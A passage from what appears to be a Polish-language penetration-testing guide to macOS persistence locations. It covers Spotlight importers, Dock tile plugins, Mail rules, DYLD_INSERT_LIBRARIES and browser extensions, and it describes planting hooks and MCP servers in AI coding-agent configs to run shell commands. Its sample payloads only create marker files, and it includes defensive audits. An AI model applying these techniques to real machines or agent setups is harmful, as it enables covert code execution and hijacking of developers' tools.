  - **Wyzwalacz**: Utworzenie nowego pliku z rozszerzeniem obsługiwanym przez wtyczkę Spotlight.
  - Wymagany root
- `Some.app/Contents/Library/Spotlight/`
  - **Wyzwalacz**: Utworzenie nowego pliku z rozszerzeniem obsługiwanym przez wtyczkę Spotlight.
  - Wymagana nowa aplikacja

#### Opis i wykorzystanie

Spotlight to wbudowana w macOS funkcja wyszukiwania, zaprojektowana tak, aby zapewniać użytkownikom **szybki i kompleksowy dostęp do danych na ich komputerach**.\
Aby umożliwić szybkie wyszukiwanie, Spotlight utrzymuje **własnościową bazę danych** i tworzy indeks, **analizując większość plików**, co pozwala szybko wyszukiwać zarówno nazwy plików, jak i ich zawartość.<sup>[[25]](#references)</sup>

Podstawą działania Spotlight jest centralny proces o nazwie „mds”, co oznacza **„metadata server”**. Proces ten koordynuje działanie całej usługi Spotlight. Uzupełnia go wiele demonów „mdworker”, które wykonują różne zadania konserwacyjne, takie jak indeksowanie różnych typów plików (`ps -ef | grep mdworker`). Zadania te są możliwe dzięki wtyczkom Spotlight importer, czyli **pakietom „.mdimporter”**, które pozwalają Spotlight rozpoznawać i indeksować zawartość wielu różnych formatów plików.

Wtyczki lub pakiety **`.mdimporter`** znajdują się we wcześniej wymienionych lokalizacjach. Nowy pakiet musi zostać wykryty i pasować do typu pliku, a Spotlight musi faktycznie zaindeksować pasujący plik; samo skopiowanie pakietu nie dowodzi, że został załadowany. [Dokumentacja Apple MDImporter](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) wiąże ładowanie z kwalifikującym się zmienionym plikiem. Wykonywanie wtyczek Spotlight importer w macOS 26 nie zostało tutaj przetestowane.

Można **znaleźć wszystkie załadowane `mdimporters`**, uruchamiając:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

Na przykład **/Library/Spotlight/iBooksAuthor.mdimporter** służy do analizowania tego typu plików (m.in. z rozszerzeniami `.iba` i `.book`):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Jeśli sprawdzisz Plist innego `mdimporter`, możesz nie znaleźć wpisu **`UTTypeConformsTo`**. Dzieje się tak, ponieważ jest to wbudowany _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)), który nie musi określać rozszerzeń.
>
> Ponadto domyślne wtyczki systemowe zawsze mają pierwszeństwo, więc atakujący może uzyskać dostęp tylko do plików, których nie indeksują własne `mdimporters` Apple.

Aby utworzyć własny importer, możesz zacząć od tego projektu: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), a następnie zmienić nazwę i **`CFBundleDocumentTypes`**, dodać **`UTImportedTypeDeclarations`**, aby obsługiwał wybrane rozszerzenie, oraz odzwierciedlić te zmiany w **`schema.xml`**.\
Następnie **zmień** kod funkcji **`GetMetadataForFile`**, aby wykonywała twój payload po utworzeniu pliku z obsługiwanym rozszerzeniem.

Na koniec **zbuduj nowy `.mdimporter` i skopiuj go** do jednej z trzech wymienionych wcześniej lokalizacji. Możesz sprawdzić, czy został załadowany, **monitorując logi** lub uruchamiając **`mdimport -L`**.

> [!TIP]
> Mimo że sandbox importera jest bardzo restrykcyjny, `mdworker` indeksuje pliki z **uprzywilejowanym dostępem do odczytu**. Złośliwy `.mdimporter` może więc odczytywać *zawartość* plików w lokalizacjach chronionych przez TCC (Pobrane, Obrazy, Biurko, …) i eksfiltrować zebrane metadane bez żadnego monitu TCC — to **obejście TCC „Sploitlight” (CVE-2025-31199)**, załatane w macOS Sequoia 15.4.<sup>[[55]](#references)</sup>

### ~~Panel preferencji~~

> [!CAUTION]
> Wygląda na to, że to już nie działa.

Opis: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Wymaga konkretnego działania użytkownika
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Opis

Wygląda na to, że to już nie działa.<sup>[[26]](#references)</sup>

### Pliki skryptów aplikacji

Opis: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga zainstalowanej aplikacji będącej celem ataku, z której ofiara korzysta lub którą uruchamia
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

**Interpretowany skrypt, który faktycznie wykonuje zainstalowana aplikacja lub narzędzie i który aktor może zmodyfikować.** Sprawdź uprawnienia pliku i ścieżkę wywołującą; samo znalezienie pliku `.sh` lub `.py` nie wystarczy. W przewodniku Apple dotyczącym [podpisywania kodu](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) napisano, że podpisane pakiety aplikacji zabezpieczają zasoby, w tym skrypty. Edycja skryptu znajdującego się w pakiecie narusza to zabezpieczenie i może zostać wykryta lub zablokowana podczas weryfikacji pakietu. Zewnętrzne skrypty, takie jak launcher Homebrew, podlegają innym zasadom podpisywania i zaufania. Historyczne przykłady z opisu obejmują:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – skrypt używany przez starsze wersje Sublime Text; należy sprawdzić, czy istnieje i jest używany przy uruchamianiu w zainstalowanej wersji. Nie było go na testowym Macu.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) lub **`/usr/local/bin/brew`** (Intel) – launcher Bash uruchamiany przy wywołaniu tej ścieżki `brew`, jeśli jest zainstalowany i aktor może go modyfikować. Na testowym Macu `/opt/homebrew/bin/brew` był zapisywalnym skryptem Bash; to obserwacja lokalna, a nie ogólna zasada dotycząca uprawnień Homebrew.
- **`idlemain.py` programu IDLE** wewnątrz pakietu aplikacji Python – zapis do niego może wymagać uprawnień administratora, ale jest uruchamiany z uprawnieniami użytkownika IDLE.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – historyczny skrypt powłoki uruchamiany jako root, gdy zainstalowano odpowiadające mu zadanie launchd `org.wireshark.ChmodBPF`. Skryptu i zadania nie było na testowym Macu.

#### Opis i wykorzystanie

Niektóre narzędzia i aplikacje wykonują interpretowane skrypty w czasie działania. Zapisywalny skrypt może wykonać dodane polecenia przy następnym uruchomieniu konkretnego programu wywołującego, o ile pozwolą na to weryfikacja podpisu, kwarantanna i inne mechanizmy kontrolne. Pierwotne badania opisywały kilka instalacji z 2019 roku; sprawdź ponownie ich ścieżki i mechanizmy uruchamiania w docelowej wersji.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

This test kopiowania dał wynik `marker fired: True` w macOS 26.5.2; oryginalny launcher pozostał nietknięty. Dowodzi to, że punkt wstrzyknięcia wykonuje się w kopii, a nie tego, że zmodyfikowany, podpisany bundle aplikacji lub prawdziwa instalacja Homebrew przejdzie wszystkie kontrole uruchamiania.

### Dock Tile Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Przydatne do bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga, aby aplikacja deklarująca plugin została wykryta/zarejestrowana i przetworzona przez Dock
  - Plugin ładuje się do pomocniczego procesu podpisanego przez **Apple**, który nie ma uprawnienia app-sandbox, a **library validation jest wyłączone**. W przywołanym badaniu ten helper nie był widoczny w interfejsie Background Task Management; widoczność w docelowym wydaniu należy sprawdzić.
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, wskazany kluczem **`NSDockTilePlugIn`** w pliku `Info.plist` aplikacji; własny plik `Info.plist` pluginu ustawia **`NSPrincipalClass`**.

#### Opis i wykorzystanie

Gdy aplikacja deklaruje `NSDockTilePlugIn`, Dock może załadować wskazany bundle do pomocniczego procesu XPC **`com.apple.dock.external.extra`** (`...extra.arm64` na Apple Silicon) podczas logowania lub dodawania jego kafelka; sama aplikacja nie musi zostać uruchomiona. Wymaga to wykrycia/zarejestrowania aplikacji i zaakceptowania jej przez macOS. Helper jest **podpisany przez Apple**, nie ma uprawnienia `com.apple.security.app-sandbox`, a jego `com.apple.security.cs.disable-library-validation` jest ustawione. Po załadowaniu wywoływana jest metoda **`setDockTile:`** klasy głównej; od tego momentu może ona subskrybować rozproszone powiadomienia (np. `com.apple.screenIsLocked`) dotyczące późniejszych zdarzeń.<sup>[[38]](#references)</sup>

W macOS 26.5.2 inspekcja tylko do odczytu za pomocą `codesign` potwierdziła podpis Apple i uprawnienia helpera, a kilka zainstalowanych aplikacji deklarowało `NSDockTilePlugIn`. Na tym Macu nie zainstalowano ani nie załadowano nowego pluginu, więc wykonanie nowo utworzonego bundle w tej wersji pozostaje nieprzetestowane.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Rozszerzenie widgetu działa we **własnym procesie**, a dodanie go **nie wywołuje** alertu Background Task Management
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Plist konfiguracji znajduje się w kontenerze chronionym przez TCC, więc edycja go z zewnątrz wymaga Full Disk Access lub obejścia TCC

#### Lokalizacja

- Bundle rozszerzenia widgetu: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Aktywne/zarejestrowane widgety: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (klucze `widgets.instances` i `widgets.widgets`)

#### Opis i wykorzystanie

Rozszerzenie WidgetKit dołączone do aplikacji działa we **własnym procesie** zarządzanym przez Notification Center. Zarejestrowanie instancji w `widgets.instances` (blob `CHSWidget` zakodowany w base64 przez `NSKeyedArchiver`, z osadzonymi danymi `INIntent`) i ponowne uruchomienie NotificationCenter powoduje załadowanie widgetu i wykonanie jego kodu `TimelineProvider`/intent.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Reguły Mail.app (uruchamianie AppleScript)

Opis: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Przydatne do omijania sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Mail.app musi być jednak skonfigurowana z kontem i uruchomiona; wyzwalaczem jest przychodzący e-mail
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Edycja reguł/skryptów spoza Mail może wymagać zamknięcia Mail i przyznania Pełnego dostępu do dysku w nowoczesnym macOS

#### Lokalizacja

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (reguły lokalne; `V10` w Sonoma/Sequoia, `V11`+ w nowszych wersjach)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (reguły synchronizowane przez iCloud, mają pierwszeństwo)
- Aktywacja reguł: **`RulesActiveState.plist`**; payload AppleScript: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Opis i wykorzystanie

Reguła Apple Mail może zawierać akcję *„Uruchom AppleScript”*. Dodając regułę dopasowującą spreparowany **temat wiadomości** i uruchamiającą skrypt atakującego, adwersarz uzyskuje **zdalnie wyzwalane, skryte** wykonanie kodu w kontekście Mail za każdym razem, gdy nadejdzie odpowiedni e-mail — jest to wektor, który omija wiele skanerów persistence, ponieważ nie tworzy żadnego LaunchAgent ani elementu logowania.<sup>[[42]](#references)</sup> Ustawienie reguły tak, by również **usuwała** wiadomość wyzwalającą, ukrywa ślady. Obrońcy mogą szukać jej bezpośrednio:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Profile konfiguracyjne (.mobileconfig)

Opis: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Przydatne do obejścia sandboxa: [🔴](https://emojipedia.org/large-red-circle)
  - Nowoczesny macOS wymaga **ręcznego zatwierdzenia przez użytkownika** w Ustawieniach systemowych → *Zarządzanie urządzeniem* (cicha instalacja `profiles install` nie jest już możliwa poza MDM)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Zainstalowane profile znajdują się w **`/Library/Managed Preferences/`** i **`/var/db/ConfigurationProfiles/`**; profil to plik XML plist z tablicą `PayloadContent`.

#### Opis i wykorzystanie

Plik `.mobileconfig` nie umożliwia bezpośredniego wykonania kodu, ale może utrwalać konfigurację, taką jak **zaufany główny urząd certyfikacji (root CA)** (`com.apple.security.root`), **globalny proxy lub proxy PAC** (`com.apple.proxy.*`), **zarządzane preferencje** (`com.apple.ManagedClient.preferences`) lub ograniczenia. W macOS 10.15 i nowszych wersjach, zgodnie z definicją [`PayloadRemovalDisallowed` firmy Apple](https://developer.apple.com/documentation/devicemanagement/toplevel), ustawienie tej wartości na `true` w profilu **zainstalowanym ręcznie**, który nie zawiera payloadu z hasłem do usuwania, wymaga **uwierzytelnienia administratora**, aby go usunąć; nie czyni to profilu całkowicie niemożliwym do usunięcia. Profile instalowane przez MDM podlegają odrębnym zasadom zarządzania i usuwania.<sup>[[44]](#references)</sup>

> [!WARNING]
> Zwykły profil konfiguracyjny **nie ma typu payloadu, który instaluje dowolny `LaunchDaemon`/`LaunchAgent`**. Zainstalowanie demona w ten sposób wymaga pełnej **rejestracji w MDM** oraz agenta/skryptu zarządzającego — nie traktuj `.mobileconfig` jako mechanizmu dostarczania launchd.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### Persistence przez DYLD_INSERT_LIBRARIES

- Przydatne do obejścia sandboxa: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **usuwa** `DYLD_*` dla plików binarnych chronionych przez SIP/platformę, aplikacji z hardened runtime i celów setuid, więc wstrzykuje bibliotekę tylko do niezabezpieczonych procesów i **nie** omija SIP ani hardened runtime
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Niezawodna metoda: słownik **`EnvironmentVariables`** w złośliwym pliku plist `LaunchAgent`/`LaunchDaemon` (uruchamianym przy logowaniu/starcie systemu)
- Nieaktualne historyczne metody (wspominane wyłącznie w raportach): **`~/.MacOSX/environment.plist`** (usunięty w wersji 10.8) i **`/etc/launchd.conf`** (usunięty w wersji 10.10)

#### Opis i wykorzystanie

Jeśli atakujący może dodać `DYLD_INSERT_LIBRARIES` do środowiska procesu ofiary, dyld ładuje do tego procesu dylib atakującego (uruchamia się jej konstruktor). Wariant zapewniający persistence umieszcza tę zmienną w `LaunchAgent`, dzięki czemu każde uruchomienie zadania ponownie wstrzykuje bibliotekę. Pamiętaj, że we współczesnym macOS `launchctl setenv DYLD_*` jest filtrowane, dlatego zamiast tego umieść zmienną w pliku plist.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Pełny opis działania dylib injection/hijacking znajdziesz tutaj:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### CLI agentów kodujących AI (hooks, serwery MCP, pliki reguł)

Opisy: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Backdoor w pliku reguł (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Przydatne do omijania sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga, aby deweloper używał odpowiedniego agenta. Polecenia startowe są wykonywane z uprawnieniami tego użytkownika, gdy agent zaakceptuje jego konfigurację; zasady zaufania do workspace i zatwierdzania MCP różnią się w zależności od produktu i trybu sesji.
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle) (działa jako użytkownik; dziedziczy uprawnienia, które ma już terminal/agent)

#### Lokalizacja

Jawne pliki konfiguracji hooków i MCP mogą spowodować **wykonanie poleceń powłoki lub procesów potomnych, gdy deweloper używa narzędzia** — albo na podstawie globalnego pliku użytkownika (persistence), albo pliku umieszczonego w repozytorium (supply-chain). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` i reguły edytora to **instrukcje dla agenta**, a nie gwarancja wykonania poleceń powłoki po ich odczytaniu; ich działanie zależy od zachowania agenta i uprawnień narzędzi. Sprawdź aktualne zasady zaufania i zatwierdzania dla każdego produktu.

- **Claude Code**
  - `~/.claude/settings.json`, projektowe `.claude/settings.json`, `.claude/settings.local.json` oraz dostępny wyłącznie dla roota **`/Library/Application Support/ClaudeCode/managed-settings.json`** (ustawień MDM/zarządzanych **nie może nadpisać** użytkownik → silna persistence)
  - Obiekt `hooks` — zdarzenia `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — każde uruchamia polecenie powłoki `command`
  - `statusLine.command` — polecenie powłoki wykonywane w celu wyświetlenia wiersza statusu (w każdej sesji)
  - Serwery MCP w `~/.claude.json` / projektowym `.mcp.json` — `command`+`args` uruchamiane jako procesy potomne
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — instrukcje, które mogą próbować przeprowadzić prompt injection, zależnie od zachowania agenta i uprawnień narzędzi
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` uruchamiane jako procesy potomne); instrukcje projektowe `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, serwery MCP); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … uruchamiają polecenia); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### Opis i wykorzystanie

Jeśli aktor może modyfikować globalne ustawienia użytkownika konta, hooki lub polecenia MCP mogą być uruchamiane podczas kolejnych sesji na tym koncie. Konfiguracja kontrolowana przez repozytorium to osobny przypadek: [aktualna dokumentacja bezpieczeństwa Claude Code](https://code.claude.com/docs/en/security) opisuje interaktywne okno dialogowe zaufania do workspace oraz osobny monit o zatwierdzenie serwerów projektowego `.mcp.json`. [Macierz uprawnień](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) wskazuje, że hooki mogą być uruchamiane po zaufaniu folderowi nadrzędnemu, a sesje `claude -p`/SDK nie wyświetlają interaktywnego monitu o zaufanie; w tych trybach nieinteraktywnych serwery MCP projektu łączą się bez monitu o zatwierdzenie. Zgłoszone obejście projektowych hooków przed zaufaniem, opisane jako CVE-2025-59536, zostało [naprawione w 2025 r.](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); nie traktuj go jako obecnego domyślnego zachowania. Wektory dostarczenia mogą obejmować przejęte repozytorium lub złośliwy instalator. Prompt injection w pliku reguł jest mniej deterministyczne niż jawny hook i nadal zależy od zatwierdzeń narzędzi.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Przykład globalnych ustawień użytkownika dla Claude Code; podczas testów umieść je wyłącznie na koncie tymczasowym:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Przykład globalnej konfiguracji Codex MCP użytkownika:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Przykładowa konfiguracja hooka Cursor; przed użyciem sprawdź schemat dla zainstalowanej wersji:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Rozszerzenia przeglądarki (Chromium: Chrome / Brave / Edge)

Opis: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [Nadużywanie ExtensionInstallForcelist w macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Przydatne do omijania sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga obsługiwanej przeglądarki oraz zainstalowanego i włączonego rozszerzenia. Zewnętrzne rozszerzenia w macOS wymagają potwierdzenia przez użytkownika; wymuszenie instalacji za pomocą zarządzanych ustawień wymaga odpowiedniej polityki przedsiębiorstwa.
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> To coś innego niż **hosty native messaging** (zobacz sekcję *Chrome native messaging hosts* powyżej). W tym przypadku mechanizmem persistence jest samo **automatycznie instalowane rozszerzenie**.

#### Lokalizacja

- **Plik JSON External Extensions** (wykrywany podczas uruchamiania przeglądarki, po czym w macOS pojawia się prośba o włączenie rozszerzenia):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (dla jednego użytkownika) lub `/Library/Application Support/Google/Chrome/External Extensions/` (dla wszystkich użytkowników)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Wymuszanie instalacji za pomocą polityki przedsiębiorstwa** przez zarządzane preferencje / profil konfiguracji:
  - klucz `ExtensionInstallForcelist` w `com.google.Chrome` (`com.brave.Browser` dla Brave, `com.microsoft.Edge` dla Edge), odczytywany z `/Library/Managed Preferences/` lub zainstalowanego pliku `.mobileconfig`

#### Opis i wykorzystanie

Są to dwie różne metody instalacji. Dokumentacja Chrome dotycząca [instalacji zewnętrznej](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) mówi, że **użytkownicy Windows i macOS muszą potwierdzić i włączyć** rozszerzenie oferowane za pośrednictwem pliku *External Extensions*; samo zapisanie tego pliku JSON nie powoduje jego uruchomienia. W przypadku instalacji dla wszystkich użytkowników w macOS Chrome wymaga również, aby plik zewnętrznego rozszerzenia był zabezpieczony przed modyfikacją przez użytkowników bez uprawnień. Zarządzana polityka `ExtensionInstallForcelist` lub `ExtensionSettings` może zainstalować i przypiąć rozszerzenie bez interakcji użytkownika; [przewodnik Google dotyczący polityk na Macu](https://support.google.com/chrome/a/answer/7517624) opisuje zarządzaną konfigurację i informuje, że użytkownik nie może usunąć rozszerzeń zainstalowanych w ten sposób. To ścieżka wdrażania przez politykę, a nie skrót oparty na `defaults write` dla pojedynczego użytkownika.<sup>[[49]](#references)</sup>

> [!WARNING]
> W macOS manifest JSON *External Extensions* musi wskazywać adres URL aktualizacji **Chrome Web Store**, a nie lokalny plik CRX. Wdrażanie przez zarządzaną politykę ma własne wymagania dotyczące przedsiębiorstwa i może dopuszczać zarządzany, samodzielnie hostowany adres URL aktualizacji. W przypadku lokalnego, rozpakowanego rozszerzenia w profilu testowym przełącznik Chrome w trybie deweloperskim `--load-extension=/path` jest osobnym mechanizmem i nie sprawia, że plik JSON External Extensions samoczynnie instaluje rozszerzenie. Nie należy traktować zapisu do `Secure Preferences` jako odpowiednika żadnej z dwóch udokumentowanych metod rejestracji.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Uruchom Chrome na tymczasowym koncie i obserwuj monit o włączenie; zachowanie samego rozszerzenia stanowi PoC wykonania po zaakceptowaniu przez użytkownika. Po teście usuń manifest i wyłącz/odinstaluj rozszerzenie w tym profilu. Ta ścieżka **nie była** testowana w aktywnym profilu Chrome na Macu badawczym. Nie wdrożono tam również ścieżki z zarządzanymi zasadami.

Wymuszona instalacja i External Extensions odwołują się do identyfikatorów rozszerzeń z **Chrome Web Store**; opis niższopoziomowej sztuczki polegającej na cichym wstrzyknięciu lokalnego rozszerzenia przez edycję profilu `Secure Preferences` podpisanego HMAC oraz innych sposobów nadużywania procesów Chromium znajdziesz tutaj:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### Schematy URL i obsługa typów plików (LaunchServices)

Opis: [Zdalne przejęcie Maca za pomocą niestandardowych schematów URL (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Wyzwalaczem jest kliknięcie przez ofiarę linku (np. w Chrome/Brave/Safari) lub otwarcie pliku z zarejestrowanym typem
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Plik `Info.plist` pakietu aplikacji deklarujący **`CFBundleURLTypes`/`CFBundleURLSchemes`** (niestandardowy schemat URL) lub **`CFBundleDocumentTypes`** (rozszerzenie pliku/UTI)
- Efektywne ustawienia domyślne dla użytkownika mogą znajdować się w **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (tablica `LSHandlers`). Obsługiwanym przez Apple API do wyboru domyślnej obsługi schematu URL jest `LSSetDefaultHandlerForURLScheme`; bezpośrednia edycja tego pliku plist nie jest udokumentowaną metodą rejestracji ani aktualizacji pamięci podręcznej.

#### Opis i wykorzystanie

